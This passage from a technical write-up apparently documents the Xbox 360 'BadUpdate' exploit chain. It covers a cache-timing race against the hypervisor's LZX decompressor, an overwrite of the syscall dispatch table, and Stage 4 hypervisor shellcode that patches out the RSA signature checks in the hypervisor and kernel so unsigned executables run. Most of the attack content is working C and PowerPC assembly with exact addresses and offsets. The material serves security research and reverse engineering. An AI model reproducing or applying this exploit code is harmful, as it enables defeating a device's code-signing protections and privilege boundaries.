All the computed addresses and sizes are packed into a `THREAD_ARGS` struct:

```c
ThreadArgs.UpdateDataPhys = MmGetPhysicalAddress(pUpdateData);
ThreadArgs.UpdateDataSize = pUpdateInfo->TotalSize;       // 0xD0000
ThreadArgs.pPayloadClean  = pPayloadClean;
ThreadArgs.pPayloadBuffer = pPayload;
ThreadArgs.PayloadPhys    = MmGetPhysicalAddress(pPayload);
ThreadArgs.PayloadSize    = PayloadDataSize;              // 0x6000
ThreadArgs.pCompressedDataClean   = pCleanUpdateData;
ThreadArgs.CompressedDataSize     = CleanUpdateDataSize;
ThreadArgs.pCompressedDataInBuffer = pUpdateData + UpdateDataOffset;
ThreadArgs.pScratchDataInBuffer   = pUpdateData + ScratchBufferOffset;
ThreadArgs.ScratchDataOffset      = ScratchBufferOffset;
ThreadArgs.ScratchDataSize        = 0x20000;
ThreadArgs.HvCheckAddress         = pCipherTextBuffer->dec_output_buffer;
ThreadArgs.ShellCodePhysAddress   = ShellCodePhys;
ThreadArgs.pScratchBuffer         = pScratchPtr;
```

### 3.11  Spawn the XKE Worker Thread

```c
HANDLE hXKEWorkerThread = CreateThread(NULL, 0, RunUpdatePayloadThreadProc, &ThreadArgs, CREATE_SUSPENDED, NULL);
XSetThreadProcessor(hXKEWorkerThread, 1);  // pin to hardware thread 1 (second CPU core)
ResumeThread(hXKEWorkerThread);
```

This thread runs `RunUpdatePayloadThreadProc` on CPU hardware thread 1. Separating the XKE execution loop from the overwrite loop onto different CPU cores is essential for the race to work: the overwrite loop must be running concurrently with the HV's LZX decompressor.

**`RunUpdatePayloadThreadProc` — worker thread execution loop:**

**Initialisation (runs once):**

1. Allocates a 128KB cache flush buffer via `XPhysicalAlloc(0x20000, MAXULONG_PTR, 0x10000, PAGE_READWRITE | MEM_LARGE_PAGES)`.

2. Calls `LockAndThrashL2(0)` and `LockAndThrashL2(1)`:
   - Each call allocates 256KB of cacheable physical memory.
   - Calls `KeLockL2(index, pPhysMemoryPtr, 256*1024, maskValue, 0)` to reserve 256KB of L2 cache pathways — preventing that space from being used for other data and forcing other data to be evicted sooner.
   - Fills the reserved range with `0x41` via `memset` to "thrash" it.
   - Calls `KeLockL2(index, pPhysMemoryPtr, 256*1024, maskValue, 0x1)` to commit/lock the range permanently.
   - The total effect is that half of the available L2 cache pathways are consumed by junk data, increasing cache pressure and causing the LZX decoder context in the scratch buffer to age out of L2 faster. This is needed for the cipher text observation to work: if the context stays in L2, the write-back to the backing physical memory (which we monitor) is delayed.

3. Patches `MmPhysical64KBMappingTable` at `0x801C1000`:
   ```c
   DWORD oldAccessMask = *(DWORD*)MmPhysical64KBMappingTable;
   *(DWORD*)MmPhysical64KBMappingTable = 0x66666666;
   ```
   `MmPhysical64KBMappingTable` is a kernel structure that describes which physical 64KB pages are accessible at virtual address `0xA0000000` (the physical view window). Setting the entry for the HV segment 3 physical range to `0x66666666` (a permissive access mask) exposes the raw encrypted bytes of HV segment 3 at `0xA0030000` in the virtual address space. This lets user-mode / kernel code observe the cipher text of HV pages.

4. Reads the initial cipher text reference values:
   ```c
   DWORD* pCipherTextPtr1 = (DWORD*)(0xA0030000 + 0x1F28);  // target write location in HV seg 3
   DWORD* pCipherTextPtr2 = (DWORD*)(0xA0030000 + (0x1F28 - 0x15E8) + 0x1AD0 + 0x80);
                          = (DWORD*)(0xA0031C70);           // just past Block 14's extent
   DWORD cipherValue1 = *pCipherTextPtr1;
   DWORD cipherValue2 = *pCipherTextPtr2;
   ```
   `pCipherTextPtr2` is chosen so that it is inside the memory range that Block 14 would reach only if the decompressor wrote past the end of Block 14's data. If the cipher text at `pCipherTextPtr2` remains unchanged when `pCipherTextPtr1` changes, it means Block 14 (the smallest block in the update file) was the one that triggered the overwrite, which is the desired outcome.

**Main loop (runs continuously until exploit succeeds):**

```
while (true):
```

5. Copies `pPayloadClean` → `pPayload` (restore XKE payload to clean state before each run).
6. Copies `pCleanUpdateData` → `pCompressedDataInBuffer` (restore update data to clean state).
7. Calls `HvxKeysExecute(PayloadPhys, PayloadSize, UpdateDataPhys, UpdateDataSize, NULL, NULL)` (syscall `0x42`):
   - The HV verifies the XKE payload signature, then runs the XKE payload in a restricted HV context.
   - The XKE payload initiates LZX decompression of the update data.
   - The LZX decompressor runs inside the HV and writes decompressed data into the output buffer, using `dec_output_buffer` from the decoder context (stored in the scratch buffer at `pUpdateData + ScratchBufferOffset`).
   - Returns `0xc8000012` on normal completion (miss — race not won), or another value on a significant event.
8. Flushes cache on `pCipherTextPtr1`: `__dcbf(0, pCipherTextPtr1)`.
9. Reads `*pCipherTextPtr1` (the cipher text at HV seg 3 + 0x1F28).
10. If cipher text changed:
    a. Calls `HvxRevokeUpdate(CacheFlushBufferPhys, 0x20000, 0)` (syscall `0x65`) — this is a HV syscall that flushes the HV's own L2 cache view for the given physical range, ensuring a stale cached view of `pCipherTextPtr2` is evicted.
    b. Flushes `pCipherTextPtr2`: `__dcbf(0, pCipherTextPtr2)`.
    c. Reads `*pCipherTextPtr2`.
    d. If `*pCipherTextPtr2 == cipherValue2` (secondary location unchanged → Block 14 hit):
       * Sets LED to green quadrants 1, 2, 3.
       * Calls `HvWriteULONG(HV_SYSCALL_POST_OUTPUT_ADDRESS, HV_CALL_R4_GADGET_ADDRESS)`:
         - `HV_SYSCALL_POST_OUTPUT_ADDRESS = 0x8000010200015FD0 + (0xD * 4) = 0x8000010200016004`
         - `HV_CALL_R4_GADGET_ADDRESS = 0x00000354`
         - `HvWriteULONG` uses `HvxWriteByte` (syscall `0x21`) four times to write one byte at a time. Each call writes `stb r4, 2(r6) / blr` code in the HV that stores a single byte of the value at the target address minus 2.
         - The effect: the HV syscall dispatch table entry for syscall `0xD` (`HvxPostOutput`) is overwritten with `0x00000354`. The dispatch table stores 32-bit offsets into the first HV segment. Offset `0x00000354` points to the instruction sequence `mtctr r4 / bctr` in the first segment.
       * Calls `HvxPostOutputExploit(0, ShellCodePhys)`:
         - This issues syscall `0xD` with `r4 = ShellCodePhys`.
         - The HV now dispatches syscall `0xD` to offset `0x00000354`, which executes `mtctr r4; bctr`.
         - `r4 = ShellCodePhys = 0x8000000000000000 | physAddr(pShellCodeData)`.
         - The HV branches to `physAddr(pShellCodeData)` — the physical address of Stage 4.
         - **Execution of Stage 4 begins at hypervisor privilege.**
       * If Stage 4 returns `0x41414141`: restores `MmPhysical64KBMappingTable`, sets LEDs to full green, calls `XLaunchNewImage("PAYLOAD:\\default.xex", 0)` to launch the user's unsigned executable.
    e. If secondary location changed (not Block 14): updates reference values, toggles LED, continues loop.

### 3.12  Main Thread: `CiphertextOverwriteLoop`

While the worker thread hammers `HvxKeysExecute`, the main CPU thread (hardware thread 0) runs this tight assembly loop. Its job is to race against the LZX decompressor: observe when the decompressor writes its context header to the scratch buffer, and immediately overwrite the `dec_output_buffer` field with the pre-computed malicious cipher text.

**Pre-loop register setup:**

```asm
mr   r31, pScratchPtr        ; physical base of scratch buffer
mr   r30, canaries           ; lookup table canaries array
mr   r29, replacements       ; lookup table replacements array
mr   r28, replacements2      ; lookup table replacements2 array
addi r26, r31, 0x2B00        ; r26 = &scratch[0x2B00] = start of cache line containing dec_output_buffer
mr   r25, writeCount         ; = 100000  (write iterations per hit)
mr   r24, delayCount         ; = 1500000 (delay cycles after canary match)
dcbf r0, r31                 ; flush cache on scratch base
```

**Inner loop (label `loop`):**

```asm
ld   r11, 0(r31)             ; load 8 bytes from scratch buffer base (the CIDL header cipher text)
cmplwi r11, 0
beq  flush                   ; if zero, no active XKE run yet → flush and retry
extrdi r10, r11, 10, 0       ; extract top 10 bits of cipher text as hash index
sldi r10, r10, 3             ; multiply by 8 (ULONGLONG index)
ldx  r9, r30, r10            ; r9 = canaries[index]
cmpld cr6, r11, r9
bne  cr6, flush              ; if cipher text doesn't match any canary → flush and retry
```

If the cipher text matches a canary:

```asm
mtctr r24                    ; counter = 1,500,000
delay:
  nop
  bdnz delay                 ; busy-wait 1,500,000 cycles
```

This delay is calibrated so that after the LZX decoder writes the context header, it advances to the point where it is about to process Block 14, approximately 1,500,000 CPU cycles later. The goal is to overwrite `dec_output_buffer` in the window between when the decompressor has validated the context and before it uses `dec_output_buffer` to write Block 14's output.

```asm
mtctr r25                    ; counter = 100,000
ldx   r9, r29, r10           ; r9 = replacements[index]  (cipher text of dec_end_input_pos)
ldx   r8, r28, r10           ; r8 = replacements2[index] (cipher text of dec_output_buffer = 0x8000010600031380)
overwrite:
  std  r9, 0x20(r26)         ; write replacement dec_end_input_pos at scratch[0x2B20]
  std  r8, 0x28(r26)         ; write replacement dec_output_buffer at scratch[0x2B28]
  dcbst r0, r26              ; store-back to L2/memory immediately
  bdnz overwrite             ; repeat 100,000 times
```

Writing 100,000 times is necessary because the HV may be evicting the scratch buffer from its cache and re-loading it repeatedly. The repeated writes maximise the probability that the HV reads the malicious value rather than the original legitimate value.

```asm
flush:
  dcbf r0, r31               ; flush the scratch buffer observation point
  b    loop
```

The `dcbf` (data cache block flush) invalidates the cache line containing the scratch buffer's first 8 bytes, forcing the next `ld r11, 0(r31)` to fetch from main memory, giving a fresh view of whatever the HV's decompressor wrote most recently.

When the timing aligns — the overwrite loop writes the malicious `dec_output_buffer` cipher text into the scratch buffer between the HV's context-header write and its read of `dec_output_buffer` for the Block 14 write — the LZX decompressor in the HV will decompress Block 14 directly into `0x8000010600031380` (HV segment 3 + `0x1380`). The specific bytes at offset `BLOCK_14_TARGET_OFFSET = 0x15E8` within Block 14 contain the instruction sequence `stb r4, 2(r6) / blr`, which lands at `HV_SEG3_OVERWRITE_OFFSET = 0x1F28` inside segment 3. This is the instruction sequence that `HV_CALL_R4_GADGET_ADDRESS` (`0x354`) needs to exist in — and after a successful race it does.

---

## Stage 4 — Hypervisor Shell Code: Repair and Patch

**Source file:** `Stage4/BadUpdateExploit-4thStage.asm`, `Stage4/Stage4_CleanHvData_Retail_17559.bin`

Stage 4 is a small shell code payload that executes at Ring -1 (hypervisor privilege). It is called when the HV dispatches syscall `0xD` after the syscall table has been overwritten in Stage 3. At entry, `r4` contains the physical address of Stage 4 (the value that was put in the overwritten syscall table entry). The Stage 4 entry point is `_hv_payload_start`.

### 4.1  Setup Stack Frame

```asm
mflr  r12
std   r12, -0x8(r1)    ; save link register
std   r30, -0x18(r1)   ; save r30
std   r31, -0x10(r1)   ; save r31
addi  r1, r1, -0x30    ; allocate 0x30 bytes of stack space
mr    r31, r4           ; r31 = shell code base address (physical address of Stage 4 binary)
```

`r31` serves as the base address for all position-independent data references within Stage 4.

### 4.2  Zero the SMC Command Buffer

```asm
addi  r12, r1, (StackSize + SmcCmdBuffer)   ; r12 = &smc_command_buffer on stack
                                             ; StackSize = 0x30, SmcCmdBuffer is the offset
                                             ; within the frame reserved for the 16-byte buffer
std   r0, 0(r12)   ; zero first 8 bytes
std   r0, 8(r12)   ; zero next 8 bytes
```

The SMC (System Management Controller) command buffer on the stack is zeroed before being filled with the LED command.

### 4.3  Send LED Color Update via SMC

```asm
li    r11, 0x99    ; LED color command opcode
stb   r11, 0(r12)
li    r11, 0xFF    ; LED override mode
stb   r11, 1(r12)
li    r11, 0xFF    ; color value = orange
stb   r11, 2(r12)

mr    r3,  r12     ; r3 = pointer to SMC command buffer
mr    r11, r31
addi  r11, r11, (HvxSendSMCMessage - _hv_payload_start)
mtctr r11
bctrl              ; call HvxSendSMCMessage
```

`HvxSendSMCMessage` is a Stage 4-internal function that communicates with the SMC hardware directly (not via the kernel, since we are in the HV). It:

1. Computes the SMC's memory-mapped physical address: `0x80000200EA001000`.
2. Writes `0x04000000` to the SMC status register at offset `0x84` to mark it as "busy".
3. Issues an `eieio` (enforce in-order execution of I/O) barrier.
4. Loops four times, each time reading a 32-bit dword from the command buffer and writing it to the SMC command register at offset `0x80`, followed by `eieio`.
5. Writes `0` to the SMC status register to mark it as "ready".

The LED flashes orange to confirm that Stage 4 is executing in HV context.

### 4.4  Restore the Corrupted Hypervisor Data Segment

The race condition in Stage 3 wrote Block 14 decompression output to HV segment 3. The decompressor wrote starting at `dec_output_buffer` (`0x8000010600031380`), which lands at offset `0x1380` inside the segment. Block 14 is `0x1AD0` bytes of decompressed data, so the write spans offsets `0x1380`–`0x2E50` within segment 3. Specifically, bytes at intra-block offset `HV_SEG3_OVERWRITE_OFFSET - 0x1380 = 0x0FA8` within Block 14 have overwritten the instruction sequence at offset `0x1F28` that Stage 4 needs (`stb r4, 2(r6) / blr`), along with all surrounding code up to the end of Block 14's write range. All of this must be restored to the original HV content before the patched HV will function correctly.

Stage 4 carries a clean copy of the affected segment inside itself, embedded as `Stage4_CleanHvData_Retail_17559.bin` (included via `.incbin`), aligned to a 128-byte (cache line) boundary:

```asm
li    r5, 0x10000 / 0x80                                          ; cache line count = 0x200
ld    r4, (hv_restore_data_address - _hv_payload_start)(%r31)    ; r4 = 0x8000010600030000
addi  r3, r31, (hypervisor_restore_data - _hv_payload_start)     ; r3 = clean data pointer in Stage 4
li    r11, HvpRelocateCacheLines    ; = 0x00000E14
mtctr r11
bctrl
```

`HvpRelocateCacheLines` is an internal HV function that copies `r5` cache lines from `r3` to `r4`, ensuring all cache lines are written to the correct physical addresses and flushed. After this call, HV segment 3 contains its original clean content — the corruption introduced by the race attack is fully undone. This is essential: leaving corrupted HV code would cause random crashes later.

### 4.5  Patch the Hypervisor RSA Signature Check

The HV function `HvpImageSignatureVerification` calls `XeCryptBnQwBeSigVerify` to validate the RSA signature of any executable before allowing it to run. To allow unsigned code, this call must always return success.

The `li r3, 1` instruction (opcode `0x38600001`) makes `XeCryptBnQwBeSigVerify` appear to always return 1 (success):

```asm
lis   r4, 0x3860        ; upper 16 bits of opcode 0x38600001
ori   r4, r4, 1         ; r4 = 0x38600001  ('li r3, 1')
ld    r3, (hv_rsa_patch_address - _hv_payload_start)(%r31)
                        ; r3 = 0x8000010400029B04
stw   r4, 0(r3)         ; overwrite 'bl XeCryptBnQwBeSigVerify' with 'li r3, 1'
```

Then flush the instruction cache line so the CPU fetches the updated instruction:

```asm
li    r5, 0x7F
andc  r3, r3, r5        ; align r3 down to cache line boundary
icbi  0, r3             ; invalidate instruction cache line
```

### 4.6  Disable RMCI to Access the Encrypted Kernel Address Range

The kernel code pages live in a memory range that has RMCI (Re-enable Memory Cache Inhibit) enabled, which prevents normal caching and means the CPU cannot execute writes to that range without first disabling RMCI:

```asm
li    r3, 0
li    r11, HvpSetRMCI    ; = 0x00000398
mtctr r11
bctrl                    ; HvpSetRMCI(0) — enable caching (disable RMCI)
```

### 4.7  Patch the Kernel RSA Signature Check

The kernel function `XexpVerifyXexHeaders` calls `XeCryptBnQwBeSigVerify` to validate XEX header signatures. Patching it with `li r3, 1` makes it always pass:

```asm
lis   r4, 0x3860
ori   r4, r4, 1          ; r4 = 0x38600001
ld    r3, (kernel_rsa_patch_address - _hv_payload_start)(%r31)
                         ; r3 = 0x800003000007BFDC
stw   r4, 0(r3)          ; overwrite 'bl XeCryptBnQwBeSigVerify'
```

Flush instruction cache:

```asm
li    r5, 0x7F
andc  r3, r3, r5
icbi  0, r3
```

### 4.8  Re-enable RMCI

```asm
li    r3, 1
li    r11, HvpSetRMCI
mtctr r11
bctrl                    ; HvpSetRMCI(1) — disable caching (re-enable RMCI)
```

RMCI must be restored so that the memory protection model of the kernel range is not permanently altered in a way that could cause other subsystems to malfunction.

### 4.9  Return Success Code to Stage 3

```asm
lis   r3, 0x4141
ori   r3, r3, 0x4141    ; r3 = 0x41414141
```

Stage 3 checks `if (result != 0x41414141)` and treats any other value as a failure. The magic value `0x41414141` (`'AAAA'`) is used as a sentinel.

### 4.10  Destroy Stack Frame and Return

```asm
addi  r1, r1, StackSize   ; deallocate stack frame
ld    r30, -0x18(r1)
ld    r31, -0x10(r1)
ld    r12, -0x8(r1)
mtlr  r12
blr                        ; return to HV syscall dispatcher
```

Control returns to the HV's syscall dispatcher. The dispatcher resumes normally, returns to the kernel, and then to Stage 3's `HvxPostOutputExploit` call site. Stage 3 reads the return value (`0x41414141`), restores `MmPhysical64KBMappingTable`, sets LEDs to fully green, and launches the user's unsigned executable via `XLaunchNewImage("PAYLOAD:\\default.xex", 0)`.

---

## Summary of the Full Execution Flow

```
Game (Ring 3) → Stage 1 save game overflow
                 → stack pivot to fake ROP stack
                 → mount PAYLOAD: drive
                 → allocate memory for Stage 2
                 → read BadUpdateExploit-2ndStage.bin from USB
                 → pivot to Stage 2 ROP chain

Stage 2 (Ring 3 ROP) → map Flash: drive
                     → load/unload bootanim.xex N times
                     → capture cipher text for each 16-byte block of Stage 3
                     → write Stage 3 cipher text into bootanim code page
                     → jump to bootanim code page (0x98030000) = Stage 3

Stage 3 (Ring 0) → read update_data.bin and xke_update.bin
                 → precompute cipher text lookup table (1024 whitening variants)
                 → expose HV segment 3 cipher text via MmPhysical64KBMappingTable
                 → spawn worker thread (core 1): hammers HvxKeysExecute in a loop,
                   monitors HV cipher text for Block 14 overwrite,
                   on success overwrites syscall table + calls Stage 4 + launches default.xex
                 → main thread: tight loop reads scratch buffer cipher text,
                   matches against lookup table, delays, then hammers dec_output_buffer
                   with malicious pointer cipher text to win the race

Stage 4 (Ring -1) → set LED orange
                  → restore corrupted HV segment 3 from embedded clean copy
                  → patch HV XeCryptBnQwBeSigVerify call → li r3, 1
                  → disable RMCI
                  → patch kernel XeCryptBnQwBeSigVerify call → li r3, 1
                  → re-enable RMCI
                  → return 0x41414141

Stage 3 (back, Ring 0) → set LED fully green
                       → XLaunchNewImage("PAYLOAD:\\default.xex")
```
